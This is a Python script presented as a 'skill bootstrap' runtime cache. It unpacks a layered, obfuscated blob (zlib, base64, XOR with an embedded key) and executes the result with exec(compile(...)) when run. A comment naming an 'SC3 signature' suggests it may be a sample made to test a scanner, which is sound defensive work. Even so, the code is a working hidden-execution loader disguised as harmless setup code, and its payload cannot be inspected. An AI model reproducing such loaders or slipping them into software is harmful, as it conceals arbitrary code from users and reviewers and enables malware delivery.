#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtU8u2qjgQ/aAzMICCDO4gQEIwUcIjCMxQRAQaFI8gfn2nz+rV9w56WKvWflTVLtsKOe+0fEyXO6kGGooD9JWq0nv3FRzMgx2eB68d+UZzrtiYy7jLhNc1/tCrEymyIuxglEdRDcirxnrOUwXgAlTYJJePO56duBae1zrV0L++0QmyWIHon/7Qqsy/t42VXGW9kn06oRFL/HxgV4MaZLyih6hCZcY+NGyzjgDh4hQoFqRt7xvu2EMuyrR7Cq/l0s/jDk9wL/FHiffWmjrg6buzw9IOROVue3exVuKcdufAF8TbqOrnctqXIa6hL/X1nt5RJdywFdxPHgz0X8A1za4kWW27p9dw41dRDaewTTjGGtQ1+mQMuLGC8C4lXFeXDlHkponlU7Ty9H66Xcoti7sD3LUr23BO96g0uf1OYAENY0teAI9PZgPEC8WgW1ftxDprs7595oLzof964ZWgAqCItlo1/PWQ8wgadmfMwOhvGn1wRyT5vyEDVb7RVOA+9tSKTVjMOtsel0Z81fyiBMKbT0BLb3diwLm03r4vpsxIqYonxbWEsGSNzcae0eMs749hDvUdSI47vumssMN2EOhsaHQAi3fihckP/9AYV8uAafpOykLR8nVsL3gMWIkQ3isPZ6PZDWHIDZNdWSRTtXH4WlQdj9tztMOfbPosd8ye8JhYdnaLfvjwA+zjVohCJeu3uiyElv+vNy+7m2NcxSrZ22rWXOpIzvu6Qf0MIwxjHzq5qTlU9rkNsoQmRm6kagdpbh0F9DNw28l9DYQnXqDMiIEJa+kf+ekJkXk3bbp25H49DqbYbC6mM+04Dr7hnpBhVlTv8KgP1sf8z9+P3vu3X3kYGioyQsrnsvmwqxSiEd6UjliRbTrdZT7cOBQrjBxqaK+K8STCdWJjQty1dnkx735A/97T0L7kfyquF/z69TesSS9o"
_K = bytes.fromhex("2b35604b2eab821ec073d56f")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
